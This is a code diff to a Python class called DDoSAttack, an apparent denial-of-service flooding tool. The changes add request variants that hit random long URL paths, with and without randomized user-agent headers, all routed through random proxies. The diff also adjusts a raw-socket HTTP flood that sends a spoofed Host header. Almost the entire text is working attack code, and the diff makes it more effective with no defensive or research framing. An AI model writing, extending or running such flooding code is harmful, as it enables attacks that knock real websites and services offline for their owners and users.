@@ -68,6 +68,7 @@ class DDoSAttack:
             user = self.ua.random
             now = datetime.now()
             st = ''
+            st2 = ''
 
             if use_proxy == "y" and proxy == "":
                 proxy_2 = "http://" + random.choice(self.proxies)
@@ -78,6 +79,9 @@ class DDoSAttack:
 
             for _ in range(random.randint(10, 200)):
                 st += random.choice(self.lib)
+
+            for _ in range(random.randint(100, 500)):
+                st2 += random.choice(self.lib)
 
             header = {'user-agent': user}
 
@@ -96,7 +100,7 @@ class DDoSAttack:
                 fake_ip = '182.21.20.32'
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((target, 80))
-                sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, 80))
+                sock.sendto(("GET /" + target + " HTTP/2\r\n").encode('ascii'), (target, 80))
                 sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, 80))
                 sock.close()
                 self.r = str(int(self.r) + 1)
@@ -114,7 +118,23 @@ class DDoSAttack:
                 self.stat()
 
             try:
+                await session.get(self.url2 + '/' + st2, timeout=3, proxy=proxy_2)
+                self.r = str(int(self.r) + 1)
+                self.stat()
+            except:
+                self.r2 = str(int(self.r2) + 1)
+                self.stat()
+
+            try:
                 await session.get(self.url2, headers=header, timeout=3, proxy=proxy_2)
+                self.r = str(int(self.r) + 1)
+                self.stat()
+            except:
+                self.r2 = str(int(self.r2) + 1)
+                self.stat()
+
+            try:
+                await session.get(self.url2 + '/' + st2, headers=header, timeout=3, proxy=proxy_2)
                 self.r = str(int(self.r) + 1)
                 self.stat()
             except:
@@ -202,6 +222,9 @@ class DDoSAttack:
                 self.stat()
 
     def run_thread(self, time_a, target, use_proxy, proxy=""):
+        if self.url2[-1] == '/':
+            self.url2 = self.url2.rstrip('/')
+
         t = time.monotonic()
         if use_proxy != 'y':
             proxy = ""
